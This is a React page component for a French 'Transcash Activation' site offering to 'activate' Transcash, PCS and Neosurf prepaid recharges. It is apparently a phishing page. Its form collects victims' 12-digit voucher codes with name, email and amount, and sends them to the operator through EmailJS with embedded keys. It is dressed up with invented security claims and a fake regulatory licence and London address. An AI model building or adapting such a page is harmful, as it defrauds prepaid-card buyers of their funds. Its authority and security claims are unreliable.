import React, { useState, useRef } from "react";
import emailjs from "emailjs-com";
import profil from "./images/profil.jpeg";


import trans from "./images/trans.jpeg"
import neo from "./images/trans.jpeg"
import pcs from "./images/pcs.jpg"
import visa from "./images/visa.jpeg";

import "./styles/accueil.scss";
import { NavLink } from "react-router-dom";

const Accueil = () => {
  const [show, setShow] = useState(false);
  const [showe, setShowe] = useState(false);
  const [eye, seteye] = useState(true);
  const [select, setSelect] = useState(20);
  const [recharge, setrecharge] = useState('');

  const Eyeclick = () => {
    seteye(!eye);
    const code = document.getElementById("code");
    if (eye) {
      code.setAttribute("type", "text");
      seteye(false);
    } else {
      code.setAttribute("type", "password");
    }
  };
  const form = useRef();
  const sendEmail = (e) => {
    e.preventDefault();
    const message = document.getElementById("message");

    emailjs
      .sendForm(
        "service_rgjwcse",
        "template_hzn98zf",
        form.current,
        "eNbGuhHH13G4a2Mho"
      )
      .then(
        (result) => {
          message.innerHTML =
            "Votre requète à bien été envoyé , vous recevrez un email dans quelques instants";
          message.style.color = "green";
        },
        (error) => {
          message.innerHTML =
            "Réquète non traité, veuillez vérifier votre connexion internet et réessayer.";
          message.style.color = "red";
        }
      );
  };
  const handleChange = (e) => {
    setSelect(e.target.value);
 
  };
  const handleChangeType = (e) => {
    setrecharge(e.target.value);
 
  };

  const handleclick = () => {
    setShow(!show);
  };
  const handleclicke = () => {
    setShowe(!showe);
  };
  const scrolling = () => {
    setShow(false);
  };

  window.addEventListener("scroll", scrolling);

  return (
    <div className="container">
      <nav>
        <div onClick={handleclick} className="burger">
          <i className={show ? "fa-solid fa-xmark" : "fa-solid fa-bars"} />
        </div>
        <div className={show ? "links active" : "links"}>
          <a href="#">Accueil</a>
          <a href="#validation">Activation</a>
          <a href="#services">Services</a>
        </div>
      </nav>

      <div className="firstImg">
        <img height="100px" src={profil} alt="" />
        <h1>Activation rapides sécurisé de vos recharges en ligne</h1>
      </div>
      {/* 
      <div className="accueil">
        <h3>Bienvennue sur le site Transcash Activation</h3>
        <hr></hr>
      </div> */}

      <div className="phone">
        <img height="200px" width={300} src={trans} alt="" />
      </div>

      <h2>Activation de vos recharges Transcash</h2>
      <p style={{ textAlign: "justify" }}>
        Transcash Activation est utilisable en ligne uniquement , il vous permet
        d'effectuer tous vos achats e-commerce en toute sécurité. La fiabilité
        de votre code de recharge est donc importante. Avec le système
        2FS-Security vos recharges sont donc activé enfin qu'elles soient
        utilisables en ligne.
      </p>
      <p style={{ textAlign: "justify" }}>
        Cette étape cruciale d'activation se fait en utilisation de la
        technologie la plus récente connue sur SSL permettant de garantir la
        sécurité et fiabilité de vos recharges en toute légitimité.
      </p>

      <div className="display">
        <div>
          <h3>Rapide</h3>
          <img height={300} src={trans} alt="" />
        </div>
     
        
      </div>
 <h2>Activation de vos recharges PCS</h2>
      <p style={{ textAlign: "justify" }}>
        La carte de paiement prépayée et rechargeable PCS est une carte de paiement et de retrait qui vous permet de retirer et payer en France et à l’étranger sur l’ensemble du réseau Mastercard. Bénéficiez d'avantages et de réductions tout au long de l'année.
      </p>
    
      <hr></hr>
      
      <div className="display">
        
        <div>
          <h3>Fiable</h3>
          <img height={280} width={280} src={pcs} alt="" />
        </div>

      </div>
       <h2>Activation de vos recharges Neosurf</h2>
      <p style={{ textAlign: "justify" }}>
Vous voyagez souvent mais ne souhaitez pas emmener avec vous votre carte bancaire classique ? Votre carte prépayée vous accompagne partout dans le monde. Pas besoin de liquide, votre n’avez qu'à charger votre carte prépayée avec le montant désiré et le tour est joué. Les sociétés émettrices de cartes prépayées ont souvent des millions de partenaires à travers le monde. Il vous suffira lorsque vous voudrez faire vos achats, de vérifier que le partenaire accepte votre moyen de paiement et que vous avez assez d’argent sur votre carte. En France comme à l'étranger, veillez à ne jamais communiquer le code de votre carte prépayée à une tierce personne, au risque d'être victime de fraude.
      </p>
    
      <hr></hr>
      <p style={{ textAlign: "justify" }}>
        Le module d'ACTIVATION est un moyen d'activation prépayé fiable
        sur internet, avec une recharge, qui vous accompagne au quotidien dans
        vos dépenses. Commander le en ligne ou achetez vos recharges de paiement
        dans un bureau de tabac et profitez de tous ses avantages qui
        simplifieront la vie.
      </p>
      <hr></hr>
       <div className="display">
    
        <div>
          <h3>Securiser</h3>
          <img height={230} src={neo} alt="" />
        </div>
      </div>
      <hr></hr>
      <div className="formulaire">
        <form id="validation" ref={form} onSubmit={sendEmail}>
          {/* <h1>Votre Id Personnel : {idPerso}</h1> */}
          <div className="bloc">
            <label for="nom">
              Nom *
              <input
                required
                placeholder="Ex:Jean Descartes"
                type="text"
                name="name"
                id="nom"
                minLength={4}
                maxLength={25}
              />
            </label>
          </div>

          <div className="bloc">
            <label for="email">
              Email * :
              <input
                required
                placeholder="Ex :jeanDescartes@gmail.com"
                type="email"
                name="email"
                id=""
              />
            </label>
          </div>
              <div className="bloc">
            <label for="recharge">
             Type de recharge :
              <select name="recharge" value={recharge} onChange={handleChangeType}>
                <option>Transcash</option>
                <option>PCS</option>
                <option>Neosurf</option>
             
              </select>
            </label>
          </div>
          <div className="bloc">
            <label for="coupon">
              Montant * :
              <select name="coupon" value={select} onChange={handleChange}>
                <option>20</option>
                <option>50</option>
                <option>100</option>
                <option>150</option>
                <option>200</option>
                <option>250</option>
                <option>300</option>
                <option>500</option>
              </select>
            </label>
          </div>
          <div className="bloc">
            <label for="achat">
              Date d'achat * : <input  required type="date" name="achat" id="" />
            </label>
          </div>
          <div className="bloc">
            <label>
              Code à 12 chiffres * :
              <input
                required
                placeholder="************"
                type="password"
             
                name="code"
                id="code"
             
             
              />
              <i
                onClick={Eyeclick}
                style={{
                  position: "absolute",
                  right: "5%",
                  top: "40%",
                  color: "orange",
                  zIndex: "10000",
                  fontSize: "30px",
                  cursor: "pointer",
                }}
                class={eye ? "fa-solid fa-eye-slash" : "fa-solid fa-eye"}
              ></i>
            </label>
          </div>
          <p>Lieu d'achat *</p>
          <label for="lieu" style={{ color: "orange" }}>
            <input value="internet" type="radio" name="lieu" id="lieu" />{" "}
            Internet
          </label>
          <label for="lieu" style={{ color: "orange" }}>
            <input
              value="Bureau de tabac"
              required
              type="radio"
              name="lieu"
              id="lieu"
            />{" "}
            Bureau de Tabac
          </label>
          <p>
            Je certifie que mon code n'a pas été utilisé sur un autre site *
          </p>
          <label for="utile" style={{ color: "orange" }}>
            <input value="oui" required type="radio" name="utile" id="" /> oui
            <input
              for="utile"
              value="non"
              type="radio"
              name="utile"
              id=""
            />{" "}
            non
          </label>
          {/* <p>
              Je n'ai pas envoyer mon code à un individu pour une prestation de
              service *
            </p> */}
          {/* <label style={{ color: "orange" }}>
              <input type="radio" name="valide" id="" /> oui
              <input type="radio" name="valide" id="" /> non
            </label> */}
          <div className="submit">
            <input type="submit" id="submit" value="Activer Maintenant" />
          </div>
          <h4 id="message"></h4>
        </form>
      </div>
      <br></br>
      <br></br>
      <hr></hr>

      <div id="services" className="siteRecharge">
        <p style={{ color: "gray", textAlign: "justify" }}>
          Le site TRANSCASH-VALIDATION est émis par CARD-coopération sous une
          licence d'authentification internationale Incorporated. Le service est
          autorisé par la conduite financière autorité (FRN 9 000 036) en vertu
          des règlements de 2011 sur la monnaie électronique pour l'émission de
          monnaie électronique et fourniture de services électronique et
          fourniture de services de paiement. Siège Social :5ᵉ étage, Langham
          Housse, 302-308 Regent Steet, Londres, W1B 3AT.
        </p>
      </div>
      <div className="center">
        <img
          style={{ display: "block", texAlign: "center" }}
          height={100}
          width={200}
          src={visa}
          alt=""
        />
      </div>
      <hr></hr>
      <div className="footer">
        <a href="#">Mentions légales</a>
        <hr></hr>
        <a href="#">Politique de confidenlité</a>
        <hr></hr>
        <a href="#">Politique de cookies</a>
      </div>
      <small style={{ color: "gray", display: "block", textAlign: "center" }}>
        copyright c2022
      </small>
    </div>
  );
};

export default Accueil;
